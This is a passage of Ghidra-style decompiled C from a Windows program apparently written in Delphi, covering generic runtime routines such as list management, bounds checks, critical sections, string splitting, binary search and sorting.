    iVar2 = FUN_00404dcc(DAT_0041981c);
    if ((int)((param_1 & 0xffff) - 0x100) < iVar2) {
      *param_2 = *(undefined4 *)(DAT_0041981c + -0x400 + (param_1 & 0xffff) * 4);
    }
    iVar2 = 0;
    *in_FS_OFFSET = uStackY_20;
    uStackY_20 = 0x40f52b;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00419820);
    return iVar2;
  }
  return (uint)uVar3 << 8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040f53c(void)

{
  int *extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  undefined *puStack_c;
  undefined *puStack_8;
  
  puStack_8 = &stack0xfffffffc;
  puStack_c = &LAB_0040f5ab;
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  _DAT_00419818 = _DAT_00419818 + 1;
  if (_DAT_00419818 == 0) {
    FUN_0040f1e0();
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_00419820);
    FUN_00404f94(&DAT_0041981c,(int)PTR_DAT_0040f1bc);
    FUN_00404a80((int **)&PTR_s_Empty_00418328,PTR_DAT_00401000,0x15);
    FUN_0040405c(&DAT_0041831c);
    FUN_0040dbdc((VARIANTARG *)&DAT_004197f8,extraout_EDX,extraout_ECX);
  }
  *in_FS_OFFSET = uStack_10;
  return;
}



int * FUN_004101e0(int *param_1,char param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffdc,in_stack_ffffffe0,
                                  in_stack_ffffffe4,in_stack_ffffffe8);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403578(param_1,'\0',param_3);
  iVar1 = FUN_00403578((int *)PTR_PTR_LAB_0040fb04,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  iVar1 = FUN_00403578((int *)PTR_PTR_LAB_0040fdc4,'\x01',extraout_ECX_01);
  param_1[2] = iVar1;
  piVar2 = (int *)FUN_00403578((int *)PTR_PTR_LAB_0040fb04,'\x01',extraout_ECX_02);
  param_1[3] = (int)piVar2;
  FUN_00410504(piVar2,param_3);
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffdc;
  }
  return param_1;
}



undefined4 FUN_0041029c(LPCVOID param_1,PVOID param_2)

{
  if (param_2 != (PVOID)0x0) {
    param_1 = FUN_00404ff8(param_1);
    if (param_2 != param_1) {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



void FUN_004102bc(int param_1,PVOID param_2)

{
  LPCVOID pvVar1;
  undefined4 uVar2;
  int iVar3;
  
  iVar3 = *(int *)(*(int *)(param_1 + 0xc) + 8) + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)FUN_00410640(*(undefined4 **)(param_1 + 0xc),iVar3);
      uVar2 = FUN_0041029c(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        FUN_00410550(*(int **)(param_1 + 0xc),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  iVar3 = *(int *)(*(int *)(param_1 + 4) + 8) + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)FUN_00410640(*(undefined4 **)(param_1 + 4),iVar3);
      uVar2 = FUN_0041029c(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        FUN_00410550(*(int **)(param_1 + 4),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  iVar3 = (**(code **)(**(int **)(param_1 + 8) + 0x14))();
  iVar3 = iVar3 + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)(**(code **)(**(int **)(param_1 + 8) + 0x18))(*(int **)(param_1 + 8),iVar3);
      uVar2 = FUN_0041029c(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        (**(code **)(**(int **)(param_1 + 8) + 0x48))(*(int **)(param_1 + 8),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  return;
}



int * FUN_00410360(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403578(param_1,'\0',param_3);
  iVar1 = FUN_00403578((int *)PTR_PTR_LAB_0040fb04,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  piVar2 = FUN_004101e0((int *)PTR_DAT_00410130,'\x01',(int)PTR_PTR_LAB_0040fbc0);
  FUN_00410504((int *)param_1[1],(int)piVar2);
  *(undefined *)(piVar2 + 4) = 1;
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_00410430(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_0041043c(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_00410448(int param_1,PVOID param_2)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *(int *)(*(int *)(param_1 + 4) + 8) + -1;
  if (-1 < iVar2) {
    do {
      piVar1 = (int *)FUN_00410640(*(undefined4 **)(param_1 + 4),iVar2);
      FUN_004102bc((int)piVar1,param_2);
      if (*(int *)(piVar1[3] + 8) == 0) {
        FUN_004035a8(piVar1);
        FUN_00410550(*(int **)(param_1 + 4),iVar2);
      }
      iVar2 = iVar2 + -1;
    } while (iVar2 != -1);
  }
  return;
}



void FUN_00410498(PVOID param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  
  puStack_c = (undefined *)0x4104a8;
  FUN_00410430(DAT_00419854);
  puStack_10 = &LAB_004104da;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  puStack_c = &stack0xfffffffc;
  FUN_00410448(DAT_00419854,param_1);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_004104e1;
  puStack_10 = (undefined *)0x4104d9;
  FUN_0041043c(DAT_00419854);
  return;
}



int FUN_00410504(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1[2];
  if (iVar1 == param_1[3]) {
    (**(code **)*param_1)();
  }
  *(int *)(param_1[1] + iVar1 * 4) = param_2;
  param_1[2] = param_1[2] + 1;
  if (param_2 != 0) {
    (**(code **)(*param_1 + 4))(param_1,param_2,0);
  }
  return iVar1;
}



void FUN_00410538(int *param_1)

{
  FUN_004106d8(param_1,0);
  FUN_0041069c(param_1,0);
  return;
}



void FUN_00410550(int *param_1,int param_2)

{
  int iVar1;
  
  if ((param_2 < 0) || (param_1[2] <= param_2)) {
    FUN_004105ec(*param_1,(int **)PTR_PTR_DAT_00418674,param_2);
  }
  iVar1 = FUN_00410640(param_1,param_2);
  param_1[2] = param_1[2] + -1;
  if (param_2 < param_1[2]) {
    FUN_00402890((undefined4 *)(param_1[1] + 4 + param_2 * 4),
                 (undefined4 *)(param_1[1] + param_2 * 4),(param_1[2] - param_2) * 4);
  }
  if (iVar1 != 0) {
    (**(code **)(*param_1 + 4))(param_1,iVar1,2);
  }
  return;
}



undefined4 FUN_004105b0(void)

{
  int unaff_EBP;
  
  return *(undefined4 *)(unaff_EBP + 4);
}



void FUN_004105b4(undefined4 param_1,byte *param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 local_10;
  undefined local_c;
  
  FUN_004105b0();
  local_c = 0;
  local_10 = param_3;
  iVar1 = FUN_0040a934((int)PTR_DAT_0040fa4c,'\x01',param_2,0,&local_10);
  FUN_00403abc(iVar1);
  return;
}



void FUN_004105ec(undefined4 param_1,int **param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  byte *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_18 = &LAB_00410634;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  FUN_00405ac0(param_2,(int *)&local_8);
  FUN_004105b4(PTR_PTR_LAB_0040fb04,local_8,param_3);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_0041063b;
  puStack_18 = (undefined *)0x410633;
  FUN_0040405c((int *)&local_8);
  return;
}



undefined4 FUN_00410640(undefined4 *param_1,int param_2)

{
  if ((param_2 < 0) || ((int)param_1[2] <= param_2)) {
    FUN_004105ec(*param_1,(int **)PTR_PTR_DAT_00418674,param_2);
  }
  return *(undefined4 *)(param_1[1] + param_2 * 4);
}



void FUN_0041069c(undefined4 *param_1,int param_2)

{
  if ((param_2 < (int)param_1[2]) || (0x7ffffff < param_2)) {
    FUN_004105ec(*param_1,(int **)PTR_PTR_DAT_004185fc,param_2);
  }
  if (param_2 != param_1[3]) {
    FUN_004026d0(param_1 + 1,param_2 << 2);
    param_1[3] = param_2;
  }
  return;
}



void FUN_004106d8(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  if ((param_2 < 0) || (0x7ffffff < param_2)) {
    FUN_004105ec(*param_1,(int **)PTR_PTR_DAT_004185b0,param_2);
  }
  if (param_1[3] < param_2) {
    FUN_0041069c(param_1,param_2);
  }
  iVar1 = param_1[2];
  if (iVar1 < param_2) {
    FUN_00402e48((undefined4 *)(param_1[1] + iVar1 * 4),(param_2 - iVar1) * 4,0);
  }
  else {
    iVar1 = iVar1 + -1;
    if (param_2 - iVar1 == 0 || param_2 < iVar1) {
      iVar2 = (param_2 - iVar1) + -1;
      do {
        FUN_00410550(param_1,iVar1);
        iVar1 = iVar1 + -1;
        iVar2 = iVar2 + 1;
      } while (iVar2 != 0);
    }
  }
  param_1[2] = param_2;
  return;
}



int * FUN_0041074c(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403578(param_1,'\0',param_3);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  iVar1 = FUN_00403578((int *)PTR_PTR_LAB_0040fb04,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  *(undefined *)(param_1 + 8) = 0;
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



undefined4 FUN_0041081c(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return *(undefined4 *)(param_1 + 4);
}



void FUN_00410830(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_0041083c(int *param_1,char param_2)

{
  int *piVar1;
  byte extraout_DL;
  
  piVar1 = FUN_00403858(param_1,param_2);
  FUN_00412634((int)piVar1);
  FUN_00403598(piVar1,extraout_DL & 0xfc);
  if ('\0' < (char)extraout_DL) {
    FUN_00403840(piVar1);
  }
  return;
}



void FUN_00410868(int *param_1,undefined4 *param_2)

{
  if (param_2 != (undefined4 *)0x0) {
    (**(code **)*param_2)(param_2,param_1);
    return;
  }
  FUN_0041087c(param_1,(int *)0x0);
  return;
}



void FUN_0041087c(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  undefined *puStack_12c;
  undefined *puStack_128;
  undefined *puStack_124;
  int local_118;
  undefined local_114;
  byte *local_110;
  undefined local_10c;
  byte local_108 [256];
  int local_8;
  
  puStack_124 = &stack0xfffffffc;
  local_8 = 0;
  puStack_128 = &LAB_00410932;
  puStack_12c = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_12c;
  if (param_2 == (int *)0x0) {
    FUN_004040f4(&local_8,0x410948);
  }
  else {
    puStack_124 = &stack0xfffffffc;
    FUN_00403520(*param_2,local_108);
    FUN_004042c0(&local_8,local_108);
  }
  local_118 = local_8;
  local_114 = 0xb;
  FUN_00403520(*param_1,local_108);
  local_110 = local_108;
  local_10c = 4;
  uVar2 = 1;
  iVar1 = FUN_0040a9f0((int)PTR_DAT_00406a38,'\x01',(int **)PTR_PTR_DAT_004185bc,1,&local_118);
  FUN_00403abc(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack_12c = &LAB_00410939;
  FUN_0040405c(&local_8);
  return;
}



void FUN_00410a0c(int *param_1,char param_2)

{
  int *piVar1;
  byte extraout_DL;
  
  piVar1 = FUN_00403858(param_1,param_2);
  FUN_00411564((int)piVar1,(int **)0x0);
  FUN_0041083c(piVar1,extraout_DL & 0xfc);
  if ('\0' < (char)extraout_DL) {
    FUN_00403840(piVar1);
  }
  return;
}



undefined4 FUN_00410a60(int *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x38))();
  (**(code **)(*param_1 + 0x24))(param_1,uVar1,param_3);
  return uVar1;
}



void FUN_00410bd4(int *param_1)

{
  if (param_1[2] == 0) {
    (**(code **)(*param_1 + 0x30))(param_1,1);
  }
  param_1[2] = param_1[2] + 1;
  return;
}



byte FUN_00410bec(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int *piVar1;
  byte bVar2;
  undefined4 uVar3;
  int iVar4;
  
  piVar1 = *(int **)(*(int *)(param_4 + -4) + 0x20);
  if (piVar1 == (int *)0x0) {
    iVar4 = (**(code **)(**(int **)(param_4 + -8) + 0x14))();
    bVar2 = 0 < iVar4;
  }
  else {
    bVar2 = 1;
    uVar3 = FUN_00403734(piVar1,(int)PTR_PTR_LAB_0040fc94);
    if ((char)uVar3 != '\0') {
      bVar2 = FUN_00410ca4(*(int **)(param_4 + -8),piVar1);
      bVar2 = bVar2 ^ 1;
    }
  }
  return bVar2;
}



void FUN_00410c90(int *param_1)

{
  param_1[2] = param_1[2] + -1;
  if (param_1[2] == 0) {
    (**(code **)(*param_1 + 0x30))(param_1,0);
  }
  return;
}



void FUN_00410ca4(int *param_1,int *param_2)

{
  uint *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined uVar4;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  uint *local_18;
  uint *local_14;
  undefined local_d;
  int *local_c;
  int *local_8;
  
  puStack_28 = &stack0xfffffffc;
  local_14 = (uint *)0x0;
  local_18 = (uint *)0x0;
  puStack_2c = &LAB_00410d39;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  local_d = 0;
  local_c = param_2;
  local_8 = param_1;
  iVar2 = (**(code **)(*param_1 + 0x14))();
  iVar3 = (**(code **)(*local_c + 0x14))();
  if (iVar2 == iVar3) {
    if (-1 < iVar2 + -1) {
      iVar3 = 0;
      uVar4 = true;
      do {
        (**(code **)(*local_8 + 0xc))(local_8,iVar3,&local_14);
        puVar1 = local_14;
        (**(code **)(*local_c + 0xc))(local_c,iVar3,&local_18);
        FUN_00404444(puVar1,local_18);
        if (!(bool)uVar4) goto LAB_00410d1e;
        iVar3 = iVar3 + 1;
        iVar2 = iVar2 + -1;
        uVar4 = iVar2 == 0;
      } while (!(bool)uVar4);
    }
    local_d = 1;
  }
LAB_00410d1e:
  *in_FS_OFFSET = uStack_30;
  puStack_28 = &LAB_00410d40;
  puStack_2c = (undefined *)0x410d38;
  FUN_00404080((int *)&local_18,2);
  return;
}



undefined4 FUN_00410d4c(void)

{
  int unaff_EBP;
  
  return *(undefined4 *)(unaff_EBP + 4);
}



void FUN_00410d50(undefined4 param_1,byte *param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 local_10;
  undefined local_c;
  
  FUN_00410d4c();
  local_c = 0;
  local_10 = param_3;
  iVar1 = FUN_0040a934((int)PTR_DAT_0040faa4,'\x01',param_2,0,&local_10);
  FUN_00403abc(iVar1);
  return;
}



void FUN_00410d88(undefined4 param_1,int **param_2,undefined4 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  byte *local_8;
  
  puStack_18 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  puStack_1c = &LAB_00410dd0;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  FUN_00405ac0(param_2,(int *)&local_8);
  FUN_00410d50(param_1,local_8,param_3);
  *in_FS_OFFSET = uStack_20;
  puStack_18 = &LAB_00410dd7;
  puStack_1c = (undefined *)0x410dcf;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00410ed4(int *param_1)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined *local_8;
  
  puStack_10 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  puStack_14 = &LAB_00410f19;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  (**(code **)(*param_1 + 0x1c))(param_1,&local_8);
  puVar1 = (undefined4 *)FUN_004044f8(local_8);
  FUN_00407b4c(puVar1);
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00410f20;
  puStack_14 = (undefined *)0x410f18;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00411050(int *param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  int local_10;
  int local_c;
  undefined4 local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_10 = 0;
  puStack_24 = &LAB_004110c8;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  local_8 = param_2;
  iVar1 = (**(code **)(*param_1 + 0x14))();
  if (-1 < iVar1 + -1) {
    local_c = 0;
    do {
      (**(code **)(*param_1 + 0xc))(param_1,local_c,&local_10);
      iVar2 = (**(code **)(*param_1 + 0x34))(param_1,local_10,local_8);
      if (iVar2 == 0) goto LAB_004110b2;
      local_c = local_c + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  local_c = -1;
LAB_004110b2:
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_004110cf;
  puStack_24 = (undefined *)0x4110c7;
  FUN_0040405c(&local_10);
  return;
}



int FUN_004111b0(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = (**(code **)(*param_1 + 0x14))();
  if (-1 < iVar1 + -1) {
    iVar3 = 0;
    do {
      iVar2 = (**(code **)(*param_1 + 0x18))(param_1,iVar3);
      if (param_2 == iVar2) {
        return iVar3;
      }
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 + -1;
    } while (iVar1 != 0);
  }
  return -1;
}



void FUN_004111e4(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  (**(code **)(*param_1 + 0x60))(param_1,param_2,param_3);
  (**(code **)(*param_1 + 0x24))(param_1,param_2,param_4);
  return;
}



void FUN_00411268(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_2c;
  undefined *puStack_28;
  undefined *puStack_24;
  undefined4 uStack_20;
  undefined *puStack_1c;
  undefined *puStack_18;
  int local_c;
  int *local_8;
  
  puStack_18 = &stack0xfffffffc;
  local_c = 0;
  puStack_1c = &LAB_00411305;
  uStack_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_20;
  puStack_24 = (undefined *)0x411290;
  local_8 = param_1;
  FUN_00410bd4(param_1);
  puStack_28 = &LAB_004112e8;
  uStack_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_2c;
  puStack_24 = &stack0xfffffffc;
  iVar1 = (**(code **)*param_2)();
  iVar2 = FUN_00411da4(param_2);
  FUN_0040414c(&local_c,(undefined4 *)0x0,iVar1 - iVar2);
  (**(code **)(*param_2 + 0xc))(param_2,local_c,iVar1 - iVar2);
  (**(code **)(*local_8 + 0x2c))(local_8,local_c);
  *in_FS_OFFSET = uStack_2c;
  puStack_24 = &LAB_004112ef;
  puStack_28 = (undefined *)0x4112e7;
  FUN_00410c90(local_8);
  return;
}



void FUN_004113c4(int *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x18))(param_1,param_2);
  (**(code **)(*param_1 + 0x48))(param_1,param_2);
  (**(code **)(*param_1 + 100))(param_1,param_2,param_3,uVar1);
  return;
}



void FUN_004114ac(int *param_1,undefined *param_2)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_18;
  undefined *puStackY_14;
  
  puStackY_14 = (undefined *)0x4114c6;
  piVar1 = FUN_004121e4((int *)PTR_PTR_LAB_0040ffc4,'\x01',param_2,0xffff);
  puStackY_14 = &LAB_004114f7;
  uStackY_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_18;
  (**(code **)(*param_1 + 0x78))(param_1,piVar1);
  *in_FS_OFFSET = uStackY_18;
  puStackY_14 = (undefined *)0x4114f6;
  FUN_004035a8(piVar1);
  return;
}



void FUN_00411564(int param_1,int **param_2)

{
  if (*(int *)(param_1 + 0xc) != 0) {
    (**(code **)(**(int **)(param_1 + 0xc) + 0x10))();
  }
  FUN_00405650((int **)(param_1 + 0xc),param_2);
  if (*(int *)(param_1 + 0xc) != 0) {
    (**(code **)(**(int **)(param_1 + 0xc) + 0xc))(*(int **)(param_1 + 0xc),param_1);
  }
  return;
}



void FUN_004115e8(int *param_1,undefined4 *param_2)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  int local_c;
  int *local_8;
  
  puStack_14 = &stack0xfffffffc;
  local_c = 0;
  puStack_18 = &LAB_0041169c;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  puStack_20 = (undefined *)0x41160f;
  local_8 = param_1;
  FUN_00410bd4(param_1);
  puStack_24 = &LAB_0041167f;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  puStack_20 = &stack0xfffffffc;
  (**(code **)(*local_8 + 0x44))();
  if (param_2 != (undefined4 *)0x0) {
    while (puVar2 = param_2, *(char *)param_2 != '\0') {
      for (; ((cVar1 = *(char *)puVar2, cVar1 != '\0' && (cVar1 != '\n')) && (cVar1 != '\r'));
          puVar2 = (undefined4 *)((int)puVar2 + 1)) {
      }
      FUN_0040414c(&local_c,param_2,(int)puVar2 - (int)param_2);
      (**(code **)(*local_8 + 0x38))(local_8,local_c);
      param_2 = puVar2;
      if (*(char *)puVar2 == '\r') {
        param_2 = (undefined4 *)((int)puVar2 + 1);
      }
      if (*(char *)param_2 == '\n') {
        param_2 = (undefined4 *)((int)param_2 + 1);
      }
    }
  }
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_00411686;
  puStack_24 = (undefined *)0x41167e;
  FUN_00410c90(local_8);
  return;
}



undefined FUN_0041173c(int param_1)

{
  if ((*(byte *)(param_1 + 4) & 4) == 0) {
    FUN_00411754(param_1,'=');
  }
  return *(undefined *)(param_1 + 7);
}



void FUN_00411754(int param_1,char param_2)

{
  if ((param_2 != *(char *)(param_1 + 7)) || ((*(byte *)(param_1 + 4) & 4) == 0)) {
    *(byte *)(param_1 + 4) = *(byte *)(param_1 + 4) | 4;
    *(char *)(param_1 + 7) = param_2;
  }
  return;
}



void FUN_0041197c(int param_1,int param_2,int param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  puVar1 = (undefined4 *)(*(int *)(param_1 + 0x10) + param_2 * 8);
  puVar2 = (undefined4 *)(*(int *)(param_1 + 0x10) + param_3 * 8);
  uVar3 = *puVar1;
  *puVar1 = *puVar2;
  *puVar2 = uVar3;
  uVar3 = puVar1[1];
  puVar1[1] = puVar2[1];
  puVar2[1] = uVar3;
  return;
}



undefined FUN_004119a0(int *param_1,undefined4 param_2,uint *param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined local_18;
  int local_14;
  
  local_18 = 0;
  uVar3 = 0;
  local_14 = param_1[5] + -1;
  if (-1 < local_14) {
    do {
      uVar2 = local_14 + uVar3 >> 1;
      iVar1 = (**(code **)(*param_1 + 0x34))
                        (param_1,*(undefined4 *)(param_1[4] + uVar2 * 8),param_2);
      if (iVar1 < 0) {
        uVar3 = uVar2 + 1;
      }
      else {
        local_14 = uVar2 - 1;
        if ((iVar1 == 0) && (local_18 = 1, *(char *)((int)param_1 + 0x1d) != '\x01')) {
          uVar3 = uVar2;
        }
      }
    } while ((int)uVar3 <= local_14);
  }
  *param_3 = uVar3;
  return local_18;
}



void FUN_00411a7c(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1[6];
  if (iVar1 < 0x41) {
    if (iVar1 < 9) {
      iVar2 = 4;
    }
    else {
      iVar2 = 0x10;
    }
  }
  else {
    iVar2 = iVar1;
    if (iVar1 < 0) {
      iVar2 = iVar1 + 3;
    }
    iVar2 = iVar2 >> 2;
  }
  (**(code **)(*param_1 + 0x28))(param_1,iVar2 + iVar1);
  return;
}



void FUN_00411aec(int *param_1)

{
  (**(code **)(*param_1 + 100))();
  return;
}



void FUN_00411afc(int *param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  if (*(char *)(param_1 + 7) != '\0') {
    FUN_00410d88(param_1,(int **)PTR_PTR_DAT_004185ac,0);
  }
  if ((param_2 < 0) || (param_1[5] < param_2)) {
    FUN_00410d88(param_1,(int **)PTR_PTR_DAT_00418674,param_2);
  }
  (**(code **)(*param_1 + 0x88))(param_1,param_2,param_3,param_4);
  return;
}



void FUN_00411bc8(int *param_1,int param_2,undefined4 *param_3)

{
  if (*(char *)(param_1 + 7) != '\0') {
    FUN_00410d88(param_1,(int **)PTR_PTR_DAT_004185ac,0);
  }
  if ((param_2 < 0) || (param_1[5] <= param_2)) {
    FUN_00410d88(param_1,(int **)PTR_PTR_DAT_00418674,param_2);
  }
  (**(code **)(*param_1 + 0x84))();
  FUN_004040b0((int *)(param_1[4] + param_2 * 8),param_3);
  (**(code **)(*param_1 + 0x80))();
  return;
}



void FUN_00411c24(int *param_1,int param_2,undefined4 param_3)

{
  if ((param_2 < 0) || (param_1[5] <= param_2)) {
    FUN_00410d88(param_1,(int **)PTR_PTR_DAT_00418674,param_2);
  }
  (**(code **)(*param_1 + 0x84))();
  *(undefined4 *)(param_1[4] + 4 + param_2 * 8) = param_3;
  (**(code **)(*param_1 + 0x80))();
  return;
}



void FUN_00411c64(int param_1,uint param_2,uint param_3,undefined *param_4)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint local_14;
  uint local_c;
  
  local_c = param_2;
  do {
    local_14 = local_c + param_3 >> 1;
    uVar3 = local_c;
    uVar4 = param_3;
    do {
      while (iVar2 = (*(code *)param_4)(param_1,uVar3,local_14), iVar2 < 0) {
        uVar3 = uVar3 + 1;
      }
      while (iVar2 = (*(code *)param_4)(param_1,uVar4,local_14), 0 < iVar2) {
        uVar4 = uVar4 - 1;
      }
      if ((int)uVar3 <= (int)uVar4) {
        FUN_0041197c(param_1,uVar3,uVar4);
        uVar1 = uVar4;
        if ((uVar3 != local_14) && (uVar1 = local_14, uVar4 == local_14)) {
          uVar1 = uVar3;
        }
        local_14 = uVar1;
        uVar3 = uVar3 + 1;
        uVar4 = uVar4 - 1;
      }
    } while ((int)uVar3 <= (int)uVar4);
    if ((int)local_c < (int)uVar4) {
      FUN_00411c64(param_1,local_c,uVar4,param_4);
    }
    local_c = uVar3;
  } while ((int)uVar3 < (int)param_3);
  return;
}



undefined4 FUN_00411da4(int *param_1)

{
  undefined4 uVar1;
  
  uVar1 = (**(code **)(*param_1 + 0x18))(param_1,1,*param_1,0,0);
  return uVar1;
}



void FUN_00411dc4(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  (**(code **)(*param_1 + 0x18))(param_1,0,*param_1,param_4,param_5);
  return;
}



void FUN_00411e7c(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int iVar1;
  byte local_10c [256];
  byte *local_c;
  undefined local_8;
  
